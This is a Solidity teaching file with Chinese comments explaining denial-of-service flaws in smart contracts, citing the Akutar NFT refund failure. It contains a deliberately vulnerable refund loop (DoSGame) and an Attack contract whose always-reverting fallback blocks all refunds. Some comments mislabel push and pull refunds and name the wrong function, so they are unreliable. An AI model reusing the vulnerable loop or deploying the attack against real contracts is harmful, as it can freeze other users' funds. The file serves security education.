// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


/*
	DoS:
	在 Web2 中, 拒绝服务攻击(DoS, Denial of Service)是指通过向服务器发送大量
	垃圾信息或干扰信息的方式, 导致服务器无法向正常用户提供服务的现象;
	而在 Web3, 它指的是利用漏洞使得智能合约无法正常提供服务

	在 2022 年 4 月, 一个很火的 NFT 项目名为 Akutar, 他们使用荷兰拍卖进行公
	开发行, 筹集了 11,539.5 ETH, 非常成功; 之前持有他们社区 Pass 的参与者会
	得到 0.5 ETH 的退款, 但是他们处理退款的时候, 发现智能合约不能正常运行, 
	全部资金被永远锁在了合约里; 他们的智能合约有拒绝服务漏洞

	预防:
	很多逻辑错误都可能导致智能合约拒绝服务, 所以开发者在写智能合约时要万分谨慎;
	以下是一些需要特别注意的地方:
	1. 外部合约的函数调用(例如 call)失败时不会使得重要功能卡死, 比如将上面漏
		洞合约中的 require(success, "Refund Fail!"); 去掉, 退款在单个地址失败
		时仍能继续运行
	2. 合约不会出乎意料的自毁(TODO: ?)
	3. 合约不会进入无限循环
	4. require 和 assert 的参数设定正确
	5. 退款时, 让用户从合约自行领取(push), 而非批量发送给用户(pull) TODO:
	6. 确保回调函数不会影响正常合约运行
	7. 确保当合约的参与者(例如 owner)永远缺席时, 合约的主要业务仍能顺利运行
*/

// 有DoS漏洞的游戏, 玩家们先存钱, 游戏结束后调用deposit退钱
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    // 游戏结束, 退款开始, 所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player]; // TODO: 这里不判断余额?
            (bool success, ) = player.call{value: refundETH}("");
			// 这里的漏洞在于是使用 call 函数, 将激活目标地址的回调函数,
			// 如果目标地址为一个恶意合约, 在回调函数中加入了恶意逻辑, 
			// 退款将不能正常进行; TODO: 数组前的players能退款成功吗? 
			// 数组之后的players将不能正常退款
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
